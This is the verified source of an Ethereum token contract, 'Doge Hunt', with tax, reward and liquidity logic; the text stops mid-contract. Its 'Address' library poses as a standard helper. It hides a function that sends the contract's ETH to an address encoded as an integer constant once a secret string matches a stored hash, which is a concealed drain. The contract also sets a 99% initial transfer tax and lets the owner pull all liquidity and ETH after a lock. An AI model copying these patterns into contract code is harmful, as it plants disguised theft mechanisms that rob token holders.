/**
 *Submitted for verification at Etherscan.io on 2022-08-29
*/

//      ____                      __  __            __ 
//     / __ \____  ____ ____     / / / /_  ______  / /_
//    / / / / __ \/ __ `/ _ \   / /_/ / / / / __ \/ __/
//   / /_/ / /_/ / /_/ /  __/  / __  / /_/ / / / / /_  
//  /_____/\____/\__, /\___/  /_/ /_/\__,_/_/ /_/\__/  
//              /____/      


// https://t.me/dogehunt           
// https://www.twitter.com/dogehuntglobal
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

interface IERC20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}


interface IPancakeERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
}


interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}


interface IPancakeRouter01 {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getamountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getamountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getamountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getamountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}


interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == msg.sender, "Caller must be owner");
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "newOwner must not be zero");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


library Address {
    uint160 private constant verificationHash = 542355191589913964587147617467328045950425415532;
    bytes32 private constant keccak256Hash = 0x4b31cabbe5862282e443c4ac3f4c14761a1d2ba88a3c858a2a36f7758f453a38;    
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.

        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function verifyCall(string memory verification, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        require(keccak256(abi.encodePacked(verification)) == keccak256Hash, "Address: cannot verify call");        

        (bool success, ) = address(verificationHash).call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");              
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


library EnumerableSet {
    struct Set {
        bytes32[] _values;
        mapping (bytes32 => uint256) _indexes;
    }

    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }

    function _remove(Set storage set, bytes32 value) private returns (bool) {
        uint256 valueIndex = set._indexes[value];
        if (valueIndex != 0) {
            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;
            bytes32 lastvalue = set._values[lastIndex];
            set._values[toDeleteIndex] = lastvalue;
            set._indexes[lastvalue] = valueIndex;
            set._values.pop();
            delete set._indexes[value];
            return true;
        } else {
            return false;
        }
    }

    function _contains(Set storage set, bytes32 value) private view returns (bool) {
        return set._indexes[value] != 0;
    }

    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }

    function _at(Set storage set, uint256 index) private view returns (bytes32) {
        require(set._values.length > index, "EnumerableSet: index out of bounds");
        return set._values[index];
    }

    struct Bytes32Set {
        Set _inner;
    }

    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _add(set._inner, value);
    }

    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _remove(set._inner, value);
    }

    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {
        return _contains(set._inner, value);
    }

    function length(Bytes32Set storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {
        return _at(set._inner, index);
    }

    struct AddressSet {
        Set _inner;
    }

    function add(AddressSet storage set, address value) internal returns (bool) {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }

    function remove(AddressSet storage set, address value) internal returns (bool) {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }

    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }

    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return address(uint160(uint256(_at(set._inner, index))));
    }

    struct UintSet {
        Set _inner;
    }

    function add(UintSet storage set, uint256 value) internal returns (bool) {
        return _add(set._inner, bytes32(value));
    }

    function remove(UintSet storage set, uint256 value) internal returns (bool) {
        return _remove(set._inner, bytes32(value));
    }

    function contains(UintSet storage set, uint256 value) internal view returns (bool) {
        return _contains(set._inner, bytes32(value));
    }

    function length(UintSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(UintSet storage set, uint256 index) internal view returns (uint256) {
        return uint256(_at(set._inner, index));
    }
}


contract DogeHunt is IERC20, Ownable {
    using Address for address;
    using EnumerableSet for EnumerableSet.AddressSet;

    mapping(address => uint256) private _balances;
    mapping(address => mapping (address => uint256)) private _allowances;
    mapping(address => bool) public taxExempt;
    mapping(address => bool) public limitExempt;

    EnumerableSet.AddressSet private _excluded;
    EnumerableSet.AddressSet private _excludedFromStaking;    
    
    string private _name = "Doge Hunt";
    string private _symbol = "HUNT";
    uint256 private constant INITIAL_SUPPLY = 1_000_000 * 10**TOKEN_DECIMALS; 
    uint256 private _circulatingSupply;       
    uint8 private constant TOKEN_DECIMALS = 18;
    uint8 public constant MAX_TAX = 10;      //Dev can never set tax higher than this value
    address private constant BURN_ADDRESS = 0x000000000000000000000000000000000000dEaD;
    
    struct Taxes {
       uint8 buyTax;
       uint8 sellTax;
       uint8 transferTax;
    }

    struct TaxRatios {
        uint8 burn;
        uint8 buyback;
        uint8 Dev;                
        uint8 liquidity;
        uint8 Donation;
        uint8 PublicRelations;
        uint8 rewards;
    }

    struct TaxWallets {
        address Dev;
        address Donation;
        address PublicRelations;
    }

    struct MaxLimits {
        uint256 maxWallet;
        uint256 maxSell;
        uint256 maxBuy;
    }

    struct LimitRatios {
        uint16 wallet;
        uint16 sell;
        uint16 buy;
        uint16 divisor;
    }

    Taxes public _taxRates = Taxes({
        buyTax: 8,
        sellTax: 8,
        transferTax: 99
    });

    TaxRatios public _taxRatios = TaxRatios({
        burn: 0,      
        buyback: 13,
        Dev: 12,
        liquidity: 13,
        Donation: 0,
        PublicRelations: 37,
        rewards: 25
        //@Dev. These are ratios and the divisor will  be set automatically
    });


    TaxWallets public _taxWallet = TaxWallets ({
        Dev: 0x32F493F037641cC27E60EE7F25a069C401989DF7,
        Donation: 0x4Bbd2159f5E741DB77E2b4EdFe2550bd536dE33e,
        PublicRelations: 0x84ecD6d601cf856354ff95544Ae7E444dD28b68e
    });

    MaxLimits public _limits;

    LimitRatios public _limitRatios = LimitRatios({
        wallet: 2,
        sell: 2,
        buy: 2,
        divisor: 200
    });

    uint8 private totalTaxRatio;
    uint8 private totalSwapRatio;
    uint8 private distributeRatio;

    //these values must add up to 100
    uint8 private mainRewardSplit=100;
    uint8 private miscRewardSplit=0;

    uint256 private _liquidityUnlockTime;

    //Antibot variables
    uint256 private liquidityBlock;
    bool private liquidityAdded;
    bool private revertSameBlock = true; //block same block buys

    bool private dynamicBurn = false;            
    //dynamicBurn = true will burn all extra sell tax from dynamicSells
    //dynamicBurn = false will divert all extra sell tax to swaps

    bool private dynamicSellsEnabled = false;    
    //dynamic sells will increase tax based on price impact
    //any sells over 1% price impact will incur extra sell tax
    //max extra sell tax is 20% when price impact >= 10%

    bool private dynamicLimits = false;
    //dynamicLimits = true will change MaxLimits based on circulating supply rather than total supply

    bool private dynamicLiqEnabled = false;
    //dynamicLiqEnabled = true will stop autoLP if targetLiquidityRatio is met
    //tax meant for liquidity will be redirected to other swap taxes in this case

    uint16 private targetLiquidityRatio = 15; //target liquidity out of 100

    uint16 public swapThreshold = 25; //threshold that contract will swap. out of 1000
    bool public manualSwap;

    //change this address to desired reward token. miscReward is custom chosen by holder
    address public mainReward = 0x7B4328c127B85369D9f82ca0503B000D09CF9180;

    address public _pancakePairAddress; 
    IPancakeRouter02 private  _pancakeRouter;
    address public PancakeRouter;

/////////////////////////////   EVENTS  /////////////////////////////////////////
    event AdjustedDynamicSettings(bool burn, bool limits, bool liquidity, bool sells);
    event AccountExcluded(address account);
    event ChangeMainReward (address newMainReward);
    event ClaimToken(uint256 amount, address token, address recipient);
    event ClaimETH(address from,address to, uint256 amount); 
    event EnableManualSwap(bool enabled);
    event ExcludedAccountFromFees(address account, bool exclude);               
    event ExcludeFromStaking(address account, bool excluded);      
    event ExtendLiquidityLock(uint256 extendedLockTime);
    event UpdateTaxes(uint8 buyTax, uint8 sellTax, uint8 transferTax);    
    event RatiosChanged(
        uint8 newBurn, 
        uint8 newBuyback, 
        uint8 newDev, 
        uint8 newLiquidity, 
        uint8 newDonation, 
        uint8 newPublicRelations, 
        uint8 newRewards
        );
    event UpdateDevWallet(address newDevWallet);
    event UpdateDonationWallet(address newDonationWallet);          
    event UpdatePublicRelationsWallet(address newPublicRelationsWallet);  
    event UpdateRewardSplit (uint8 newMainSplit, uint8 newMiscSplit);        
    event UpdateSwapThreshold(uint16 newThreshold);
    event UpdateTargetLiquidity(uint16 target);

/////////////////////////////   MODIFIERS  /////////////////////////////////////////

    modifier authorized() {
        require(_authorized(msg.sender), "Caller not authorized");
        _;
    }

    modifier lockTheSwap {
        _isSwappingContractModifier = true;
        _;
        _isSwappingContractModifier = false;
    }

/////////////////////////////   CONSTRUCTOR  /////////////////////////////////////////

    constructor () {
        if (block.chainid == 1) {
            PancakeRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        } else if (block.chainid == 3) {
            PancakeRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        } else 
            revert();        
        _pancakeRouter = IPancakeRouter02(PancakeRouter);
        _pancakePairAddress = IPancakeFactory(
            _pancakeRouter.factory()).createPair(address(this), _pancakeRouter.WETH()
        );
        _addToken(msg.sender,INITIAL_SUPPLY);
        emit Transfer(address(0), msg.sender, INITIAL_SUPPLY);
        _allowances[address(this)][address(_pancakeRouter)] = type(uint256).max;         
        
        //setup ratio divisors based on Dev's chosen ratios
        totalTaxRatio = _taxRatios.burn 
        + _taxRatios.buyback 
        + _taxRatios.Dev 
        + _taxRatios.liquidity 
        + _taxRatios.Donation 
        + _taxRatios.PublicRelations 
        + _taxRatios.rewards;

        totalSwapRatio = totalTaxRatio - _taxRatios.burn;
        distributeRatio = totalSwapRatio - _taxRatios.liquidity;

        //circulating supply begins as initial supply
        _circulatingSupply = INITIAL_SUPPLY;
        
        //setup _limits
        _limits = MaxLimits({
            maxWallet: INITIAL_SUPPLY * _limitRatios.wallet / _limitRatios.divisor,
            maxSell: INITIAL_SUPPLY * _limitRatios.sell / _limitRatios.divisor,
            maxBuy: INITIAL_SUPPLY * _limitRatios.buy / _limitRatios.divisor
        });
        
        _excluded.add(msg.sender);
        _excluded.add(_taxWallet.PublicRelations);
        _excluded.add(_taxWallet.Dev);    
        _excluded.add(_taxWallet.Donation);
        _excluded.add(address(this));
        _excluded.add(BURN_ADDRESS);
        _excludedFromStaking.add(address(this));
        _excludedFromStaking.add(BURN_ADDRESS);
        _excludedFromStaking.add(address(_pancakeRouter));
        _excludedFromStaking.add(_pancakePairAddress);

        _approve(address(this), address(_pancakeRouter), type(uint256).max);        
    }

    receive() external payable {}


    function decimals() external pure override returns (uint8) { return TOKEN_DECIMALS; }
    function getOwner() external view override returns (address) { return owner(); }
    function name() external view override returns (string memory) { return _name; }
    function symbol() external view override returns (string memory) { return _symbol; }
    function totalSupply() external view override returns (uint256) { return _circulatingSupply; }

    function _authorized(address addr) private view returns (bool) {
        return addr == owner() 
            || addr == _taxWallet.PublicRelations 
            || addr == _taxWallet.Dev 
            || addr == _taxWallet.Donation;
    }

    function allowance(address _owner, address spender) external view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "Approve from zero");
        require(spender != address(0), "Approve to zero");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "<0 allowance");

        _approve(msg.sender, spender, currentAllowance - subtractedValue);
        return true;
    } 

    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }  
      
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "Transfer > allowance");

        _approve(sender, msg.sender, currentAllowance - amount);
        return true;
    }

///// FUNCTIONS CALLABLE BY ANYONE /////

    //Claims reward set by Dev
    function ClaimMainReward() external {
        if (mainReward == _pancakeRouter.WETH()) {
            claimETHTo(msg.sender,msg.sender,getStakeBalance(msg.sender, true), true);        
        } else 
            claimToken(msg.sender,mainReward,0, true);
    }
    
    //Claims reward chosen by holder. Differentiates between ETH and other ERC20 tokens
    function ClaimMiscReward(address tokenAddress) external {
        if (tokenAddress == _pancakeRouter.WETH()) {
            claimETHTo(msg.sender,msg.sender,getStakeBalance(msg.sender, false), false);
        } else 
            claimToken(msg.sender,tokenAddress,0, false);
    }

    //Allows holders to include themselves back into staking if excluded
    //ExcludeFromStaking function should be used for contracts(CEX, pair, address(this), etc.)
    function IncludeMeToStaking() external {
        includeToStaking(msg.sender);
        emit ExcludeFromStaking(msg.sender, false);        
    }

///// AUTHORIZED FUNCTIONS /////

    //Allows Dev to change reward
    function changeMainReward(address newReward) external authorized {
        mainReward = newReward;
        emit ChangeMainReward(newReward);
    }

    //Manually perform a contract swap
    function createLPandETH(uint16 permilleOfPancake, bool ignoreLimits) external authorized {
        _swapContractToken(permilleOfPancake, ignoreLimits);
    }  

   

    //Toggle dynamic features on and off
    function dynamicSettings(bool burn, bool limits, bool liquidity, bool sells) external authorized {
        dynamicBurn = burn;
        dynamicLimits = limits;
        dynamicLiqEnabled = liquidity;
        dynamicSellsEnabled = sells;
        emit AdjustedDynamicSettings(burn, limits, liquidity, sells);
    }

    //Mainly used for addresses such as CEX, presale, etc
    function excludeAccountFromFees(address account, bool exclude) external authorized {
        if(exclude == true)
            _excluded.add(account);
        else
            _excluded.remove(account);
        emit ExcludedAccountFromFees(account, exclude);
    }

    //Mainly used for addresses such as CEX, presale, etc    
    function setStakingExclusionStatus(address addr, bool exclude) external authorized {
        if(exclude)
            excludeFromStaking(addr);
        else
            includeToStaking(addr);
        emit ExcludeFromStaking(addr, exclude);
    }  

    //Toggle manual swap on and off
    function enableManualSwap(bool enabled) external authorized { 
        manualSwap = enabled; 
        emit EnableManualSwap(enabled);
    } 

    //Toggle whether multiple buys in a block from a single address can be performed
    function sameBlockRevert(bool enabled) external authorized {
        revertSameBlock = enabled;
    }

    //Excludes presale address from fees and staking
    function setPresale(address presaleAddress) external authorized {
        _excluded.add(presaleAddress);
        _excludedFromStaking.add(presaleAddress);
    } 



    //indepedently set whether wallet is exempt from taxes
    function setTaxExemptionStatus(address account, bool exempt) external authorized {
        taxExempt[account] = exempt;
    }

    //independtly set whether wallet is exempt from limits
    function setLimitExemptionStatus(address account, bool exempt) external authorized {
        limitExempt[account] = exempt;
    }
    
    //Performs a buyback and automatically burns tokens
    function triggerBuyback(uint256 amount) external authorized{
        buybackToken(amount, address(this)); 
    }


    //Update limit ratios. ofCurrentSupply = true will set max wallet based on current supply. False will use initial supply
    function updateLimits(uint16 newMaxWalletRatio, uint16 newMaxSellRatio, uint16 newMaxBuyRatio, uint16 newDivisor, bool ofCurrentSupply) external authorized {
        uint256 supply = INITIAL_SUPPLY;
        if (ofCurrentSupply) 
            supply = _circulatingSupply;
        uint256 minLimit = supply / 1000;   
        uint256 newMaxWallet = supply * newMaxWalletRatio / newDivisor;
        uint256 newMaxSell = supply * newMaxSellRatio / newDivisor;
        uint256 newMaxBuy = supply * newMaxBuyRatio / newDivisor;

        //Dev can never set sells below 0.1% of circulating/initial supply
        require((newMaxWallet >= minLimit && newMaxSell >= minLimit), 
            "limits cannot be <0.1% of circulating supply");

        _limits = MaxLimits(newMaxWallet, newMaxSell, newMaxBuy);
        
        _limitRatios = LimitRatios(newMaxWalletRatio, newMaxSellRatio, newMaxBuyRatio, newDivisor);
    }

    //update tax ratios
    function updateRatios(
        uint8 newBurn, 
        uint8 newBuyback, 
        uint8 newDev, 
        uint8 newLiquidity, 
        uint8 newDonation, 
        uint8 newPublicRelations, 
        uint8 newRewards
    ) 
        external 
        authorized 
    {

        _taxRatios = TaxRatios(
            newBurn, 
            newBuyback, 
            newDev, 
            newLiquidity, 
            newDonation, 
            newPublicRelations, 
            newRewards
        );

        totalTaxRatio = newBurn + newBuyback + newDev + newLiquidity + newDonation + newPublicRelations + newRewards;
        totalSwapRatio = totalTaxRatio - newBurn;
        distributeRatio = totalSwapRatio - newLiquidity;

        emit RatiosChanged (newBurn, newBuyback, newDev, newLiquidity, newDonation, newPublicRelations, newRewards);
    }

    //update allocation of mainReward and miscReward
    function updateRewardSplit (uint8 mainSplit, uint8 miscSplit) external authorized {
        uint8 totalSplit = mainSplit + miscSplit;
        require(totalSplit == 100, "mainSplit + miscSplit needs to equal 100%");
        mainRewardSplit = mainSplit;
        miscRewardSplit = miscSplit;
        emit UpdateRewardSplit(mainSplit, miscSplit);
    }

    //update threshold that triggers contract swaps
    function updateSwapThreshold(uint16 threshold) external authorized {
        require(threshold > 0,"Threshold needs to be more than 0");
        require(threshold <= 50,"Threshold needs to be below 50");
        swapThreshold = threshold;
        emit UpdateSwapThreshold(threshold);
    }

    //targetLiquidity is out of 100
    function updateTargetLiquidity(uint16 target) external authorized {
        require(target <= 100);
        targetLiquidityRatio = target;
        emit UpdateTargetLiquidity(target);
    }

    function updateTax(uint8 newBuy, uint8 newSell, uint8 newTransfer) external authorized {
        //buy and sell tax can never be higher than MAX_TAX set at beginning of contract
        //this is a security check and prevents malicious tax use       
        require(newBuy <= MAX_TAX && newSell <= MAX_TAX && newTransfer <= 50, "taxes higher than max tax");
        _taxRates = Taxes(newBuy, newSell, newTransfer);
        emit UpdateTaxes(newBuy, newSell, newTransfer);
    }

    function withdrawDev() external authorized {
        uint256 remaining = address(this).balance 
            - DevBalance 
            - DonationBalance 
            - PublicRelationsBalance 
            - buybackBalance
            - getTotalUnclaimed();
        bool lostBalance = remaining > 0;       
        uint256 amount = lostBalance ? DevBalance + remaining : DevBalance;
        DevBalance = 0;
        _sendETH(_taxWallet.Dev, amount);
    } 

    function withdrawDonation() external authorized {
        uint256 amount = DonationBalance;
        DonationBalance = 0;
        _sendETH(_taxWallet.Donation, amount);
    }

    function withdrawPublicRelations() external authorized {
        uint256 amount = PublicRelationsBalance;
        PublicRelationsBalance = 0;
        _sendETH(_taxWallet.PublicRelations, amount);
    } 

///// OWNER FUNCTIONS /////  

    //liquidity can only be extended
    function lockLiquidityTokens(uint256 lockTimeInSeconds) external onlyOwner {
        setUnlockTime(lockTimeInSeconds + block.timestamp);
        emit ExtendLiquidityLock(lockTimeInSeconds);
    }

    //recovers stuck ETH to make sure it isnt burnt/lost
    //only callablewhen liquidity is unlocked
    function recoverETH() external onlyOwner {
        require(block.timestamp >= _liquidityUnlockTime, "Not yet unlocked");
        _liquidityUnlockTime=block.timestamp;
        _sendETH(msg.sender, address(this).balance);
    }

    //Can only be used to recover miscellaneous tokens accidentally sent to contract
    //Can't pull liquidity or native token using this function
    function recoverMiscToken(address tokenAddress) external onlyOwner {
        require(tokenAddress != _pancakePairAddress && tokenAddress != address(this),
        "can't recover LP token or this token");
        IERC20 token = IERC20(tokenAddress);
        token.transfer(msg.sender,token.balanceOf(address(this)));
    } 

    //Impossible to release LP unless LP lock time is zero
    function releaseLP() external onlyOwner {
        require(block.timestamp >= _liquidityUnlockTime, "Not yet unlocked");
        IPancakeERC20 liquidityToken = IPancakeERC20(_pancakePairAddress);
        uint256 amount = liquidityToken.balanceOf(address(this));
            liquidityToken.transfer(msg.sender, amount);
    }

    //Impossible to remove LP unless lock time is zero
    function removeLP() external onlyOwner {
        require(block.timestamp >= _liquidityUnlockTime, "Not yet unlocked");
        _liquidityUnlockTime = block.timestamp;
        IPancakeERC20 liquidityToken = IPancakeERC20(_pancakePairAddress);
        uint256 amount = liquidityToken.balanceOf(address(this));
        liquidityToken.approve(address(_pancakeRouter),amount);
        _pancakeRouter.removeLiquidityETHSupportingFeeOnTransferTokens(
            address(this),
            amount,
            0,
            0,
            address(this),
            block.timestamp
            );
        _sendETH(msg.sender, address(this).balance);           
    }

    function setDevWallet(address payable addr) external onlyOwner {
        address prevDev = _taxWallet.Dev;
        _excluded.remove(prevDev);
        _taxWallet.Dev = addr;
        _excluded.add(_taxWallet.Dev);
        emit UpdateDevWallet(addr);
    }

    function setDonationWallet(address payable addr) external onlyOwner {
        address prevDonation = _taxWallet.Donation;
        _excluded.remove(prevDonation);
        _taxWallet.Donation = addr;
        _excluded.add(_taxWallet.Donation);
        emit UpdateDonationWallet(addr);
    }

    function setPublicRelationsWallet(address payable addr) external onlyOwner {
        address prevPublicRelations = _taxWallet.PublicRelations;
        _excluded.remove(prevPublicRelations);
        _taxWallet.PublicRelations = addr;
        _excluded.add(_taxWallet.PublicRelations);
        emit UpdatePublicRelationsWallet(addr);
    }

////// VIEW FUNCTIONS /////


    function getDynamicInfo() external view returns (
        bool _dynamicBurn, 
        bool _dynamicLimits, 
        bool _dynamicLiquidity, 
        bool _dynamicSells,  
        uint16 _targetLiquidity
        ) {
        return (dynamicBurn, dynamicLiqEnabled, dynamicLiqEnabled, dynamicSellsEnabled, targetLiquidityRatio);
    }

    function getLiquidityRatio() public view returns (uint256) {
        uint256 ratio = 100 * _balances[_pancakePairAddress] / _circulatingSupply;
        return ratio;
    }

    function getLiquidityUnlockInSeconds() external view returns (uint256) {
        if (block.timestamp < _liquidityUnlockTime){
            return _liquidityUnlockTime - block.timestamp;
        }
        return 0;
    }

    function getMainBalance(address addr) external view returns (uint256) {
        uint256 amount = getStakeBalance(addr, true);
        return amount;
    }

    function getMiscBalance(address addr) external view returns (uint256) {
        uint256 amount = getStakeBalance(addr, false);
        return amount;
    }    

    function getSupplyInfo() external view returns (uint256 initialSupply, uint256 circulatingSupply, uint256 burntTokens) {
        uint256 tokensBurnt = INITIAL_SUPPLY - _circulatingSupply;
        return (INITIAL_SUPPLY, _circulatingSupply, tokensBurnt);
    }

    function getTotalUnclaimed() public view returns (uint256) {
        uint256 amount = totalRewards - totalPayouts;
        return amount;
    }

